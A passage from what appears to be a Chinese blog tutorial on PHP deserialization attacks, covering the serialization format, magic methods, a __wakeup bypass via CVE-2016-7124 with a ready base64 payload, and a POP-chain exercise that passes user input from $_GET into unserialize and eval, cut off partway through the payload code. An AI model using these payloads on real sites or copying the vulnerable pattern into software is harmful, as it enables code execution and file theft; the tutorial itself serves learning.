class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $flag = <span class="string">"flag&#123;233&#125;"</span>;</span><br><span class="line">        <span class="keyword">public</span> $name = <span class="string">"baba"</span>;</span><br><span class="line">        <span class="keyword">public</span> $age = <span class="string">"18"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">Info</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'输出'</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">' '</span>.<span class="keyword">$this</span>-&gt;age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $test = <span class="keyword">new</span> testclass();</span><br><span class="line">    $test-&gt;name = <span class="string">'zhaibaba'</span>;</span><br><span class="line">    $test -&gt;age =<span class="string">'18'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $test-&gt;Info();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">    $data = serialize($test);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"序列化\n"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $data;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure><p>输出<br>输出zhaibaba 18</p><p>序列化<br>O:9:”testclass”:3:{s:15:” testclass flag”;s:9:”flag{233}”;s:4:”name”;s:8:”zhaibaba”;s:3:”age”;s:2:”18”;}</p><p><code>O:9:&quot;testclass&quot;</code> 代表Object(对象) 9个字符:testclass<br><code>:3</code>对象属性个数为3<br><code>{}</code>中为属性字符数：属性值<br><code>s:15:&quot; testclass flag&quot;</code>  为 string类型 private私有属性 会加类名  public 共有的 直接属性名 </p><blockquote><p> public权限就是正常的变量权限，一般声明的变量权限均为public<br>protected权限是私有权限，即只能在类内使用，子类可以继承这个变量<br>private权限也是私有权限，比protected权限更似有一些，只能在本类内使用，子类不能继承</p></blockquote><h3 id="反序列实例"><a href="#反序列实例" class="headerlink" title="反序列实例"></a>反序列实例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$un = unserialize($data);</span><br><span class="line">   <span class="comment"># $un = unserialize('O:9:"testclass":2:&#123;s:4:"name";s:8:"zhaibaba";s:3:"age";s:2:"18";&#125;');</span></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"反序列化\n"</span>;</span><br><span class="line">   var_dump($un);</span><br></pre></td></tr></table></figure><p>反序列化为一个对象了<br><img src="https://img-blog.csdnimg.cn/20200103114111631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h1><blockquote><p>魔术方法：在php中以两个下划线字符（__）开头的方法，方法名都是PHP预先定义好的，之所以称为魔术方法<br>就是这些方法不需要显示的调用而是由某种特定的条件触发执行。</p></blockquote><p>在利用对PHP反序列化进行利用时，经常需要通过反序列化中的魔术方法，检查方法里有无敏感操作来进行利用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">常见方法</span><br><span class="line">__constuct: 构建对象的时被调用</span><br><span class="line"></span><br><span class="line">__destruct: 明确销毁对象或脚本结束时被调用</span><br><span class="line"></span><br><span class="line">__wakeup: 当使用unserialize时被调用，可用于做些对象的初始化操作</span><br><span class="line"></span><br><span class="line">__sleep: 当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用</span><br><span class="line"></span><br><span class="line">__call: 调用不可访问或不存在的方法时被调用</span><br><span class="line"></span><br><span class="line">__callStatic: 调用不可访问或不存在的静态方法时被调用</span><br><span class="line"></span><br><span class="line">__set: 当给不可访问或不存在属性赋值时被调用</span><br><span class="line"></span><br><span class="line">__get: 读取不可访问或不存在属性时被调用</span><br><span class="line"></span><br><span class="line">__isset: 对不可访问或不存在的属性调用<span class="keyword">isset</span>()或<span class="keyword">empty</span>()时被调用</span><br><span class="line"></span><br><span class="line">__unset: 对不可访问或不存在的属性进行<span class="keyword">unset</span>时被调用</span><br><span class="line"></span><br><span class="line">__invoke: 当以函数方式调用对象时被调用</span><br><span class="line"></span><br><span class="line">__toString: 当一个类被转换成字符串时被调用</span><br><span class="line"></span><br><span class="line">__clone: 进行对象<span class="keyword">clone</span>时被调用，用来调整对象的克隆行为</span><br><span class="line"></span><br><span class="line">__debuginfo: 当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5<span class="number">.6</span>版本</span><br><span class="line"></span><br><span class="line">__set_state: 当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值</span><br></pre></td></tr></table></figure><h2 id="比较重要的方法"><a href="#比较重要的方法" class="headerlink" title="比较重要的方法"></a>比较重要的方法</h2><p><strong>__sleep()</strong></p><blockquote><p> serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。</p></blockquote><p>对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。</p><p>__wakeup()</p><blockquote><p>unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup<br>方法，预先准备对象需要的资源。</p></blockquote><p>预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Caiji</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ID, $sex, $age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ID = $ID;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex = $sex;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">"ID: %s, age: %d, sex: %s"</span>, <span class="keyword">$this</span>-&gt;ID, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;info . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * serialize前调用 用于删选需要被序列化存储的成员变量</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array [description]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">'ID'</span>, <span class="string">'sex'</span>, <span class="string">'age'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * unserialize前调用 用于预先准备对象资源</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">"ID: %s, age: %d, sex: %s"</span>, <span class="keyword">$this</span>-&gt;ID, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$me = <span class="keyword">new</span> Caiji(<span class="string">'twosmi1e'</span>, <span class="number">20</span>, <span class="string">'male'</span>);</span><br><span class="line"></span><br><span class="line">$me-&gt;getInfo();</span><br><span class="line"><span class="comment">//存在__sleep(函数，$info属性不会被存储</span></span><br><span class="line">$temp = serialize($me);</span><br><span class="line"><span class="keyword">echo</span> $temp . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"></span><br><span class="line">$me = unserialize($temp);</span><br><span class="line"><span class="comment">//__wakeup()组装的$info</span></span><br><span class="line">$me-&gt;getInfo();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果<br><img src="https://img-blog.csdnimg.cn/20200103135151309.png" alt="在这里插入图片描述"></p><p><strong>__toString()</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__toString() 方法用于一个类被当成字符串时应怎样回应。</span><br><span class="line">例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，</span><br><span class="line">否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</span><br></pre></td></tr></table></figure><p>简单的说就是 把对象用字符串表示，就自动调用这个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Caiji</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ID, $sex, $age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ID = $ID;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex = $sex;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">"ID: %s, age: %d, sex: %s"</span>, <span class="keyword">$this</span>-&gt;ID, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;info;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$me = <span class="keyword">new</span> Caiji(<span class="string">'zhaibaba'</span>, <span class="number">20</span>, <span class="string">'male'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'__toString:'</span>. <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> $me.<span class="string">'&lt;br&gt;'</span>;</span><br></pre></td></tr></table></figure><p>结果<br><img src="https://img-blog.csdnimg.cn/20200103141055940.png" alt="在这里插入图片描述"></p><h1 id="反序列化对象注入"><a href="#反序列化对象注入" class="headerlink" title="反序列化对象注入"></a>反序列化对象注入</h1><h2 id="绕过-wakeup-方法"><a href="#绕过-wakeup-方法" class="headerlink" title="绕过__wakeup()方法"></a>绕过__wakeup()方法</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123; </span><br><span class="line">  <span class="keyword">protected</span> $file=<span class="string">'index.php'</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">      <span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt; file,<span class="string">"\\"</span>)===<span class="keyword">false</span> &amp;&amp;  strchr(<span class="keyword">$this</span>-&gt;file, <span class="string">'/'</span>)===<span class="keyword">false</span>)</span><br><span class="line">        show_source(dirname (<span class="keyword">__FILE__</span>).<span class="string">'/'</span>.<span class="keyword">$this</span> -&gt;file);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Wrong filename.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">   <span class="keyword">$this</span>-&gt; file=<span class="string">'index.php'</span>;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span> ;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span> <span class="comment">#&lt;!--key in flag.php--&gt;</span></span><br></pre></td></tr></table></figure><p>分析一下源码，<code>__destruct方法中show_source(dirname (__FILE__).&#39;/&#39;.$this -&gt;file);</code>会读取file文件内容，我们需要利用这里来读flag.php，思路大概就是构造序列化对象然后base64编码传入，经过unserialize将file设为flag.php，<code>但是__wakeup会在unserialize之前执行，所以要绕过这一点。</code></p><p><strong>这里就要用到CVE-2016-7124漏洞，当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</strong></p><p>构造序列化对象：O:5:”SoFun”:<strong>1</strong>:{S:7:”\00<em>\00file”;s:8:”flag.php”;}<br>绕过__wakeup：O:5:”SoFun”:*</em>2*<em>:{S:7:”\00</em>\00file”;s:8:”flag.php”;}</p><p>注意：因为file是protect属性，所以需要加上\00*\00。再base64编码。<br>payload：Tzo1OiJTb0Z1biI6Mjp7Uzo3OiJcMDAqXDAwZmlsZSI7czo4OiJmbGFnLnBocCI7fQ==</p><h1 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a>POP链构造</h1><h2 id="POP：面向属性编程"><a href="#POP：面向属性编程" class="headerlink" title="POP：面向属性编程"></a>POP：面向属性编程</h2><p>面向属性编程（Property-Oriented Programing） 用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链来执行一些操作。</p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>在二进制利用时，ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集，而 POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。<br>二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，前提：进行反序列化的数据能够被用户输入所控制。</p><h2 id="POP链利用"><a href="#POP链利用" class="headerlink" title="POP链利用"></a>POP链利用</h2><p>一般的序列化攻击都在PHP魔术方法中出现可利用的漏洞，因为自动调用触发漏洞，但如果关键代码没在魔术方法中，而是在一个类的普通方法中。这时候就可以通过构造POP链寻找相同的函数名将类的属性和敏感函数的属性联系起来。</p><h2 id="训练"><a href="#训练" class="headerlink" title="训练"></a>训练</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($test2,$arr)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $s1 = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        $s1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod2 = <span class="string">"字符串拼接"</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $str1;</span><br><span class="line">    <span class="keyword">public</span> $str2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $zhaibaba;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;zhaibaba);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[<span class="string">'string'</span>];</span><br><span class="line">unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到需要执行GetFlag类中的get_flag()函数，这是一个类的普通方法。要让这个方法执行，需要构造一个POP链。</p><ol><li>string1中的<strong>tostring存在$this-&gt;str1-&gt;get_flag()，分析一下要自动调用</strong>tostring()需要把类string1当成字符串来使用，因为调用的是参数str1的方法，所以需要把str1赋值为类GetFlag的对象。</li><li>发现类func中存在<strong>invoke方法执行了字符串拼接，需要把func当成函数使用自动调用</strong>invoke然后把$mod1赋值为string1的对象与$mod2拼接。</li><li>在funct中找到了函数调用，需要把mod1赋值为func类的对象，又因为函数调用在__call方法中，且参数为$test2,即无法调用test2方法时自动调用 __call方法；</li><li>在Call中的test1方法中存在$this-&gt;mod1-&gt;test2();，需要把$mod1赋值为funct的对象，让__call自动调用。</li><li>查找test1方法的调用点，在start_gg中发现$this-&gt;mod1-&gt;test1();，把$mod1赋值为start_gg类的对象，等待__destruct()自动调用。</li></ol><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> Call();<span class="comment">//把$mod1赋值为Call类对象</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> funct();<span class="comment">//把 $mod1赋值为funct类对象</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1= <span class="keyword">new</span> func();<span class="comment">//把 $mod1赋值为func类对象</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($test2,$arr)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $s1 = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        $s1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1= <span class="keyword">new</span> string1();<span class="comment">//把 $mod1赋值为string1类对象</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span 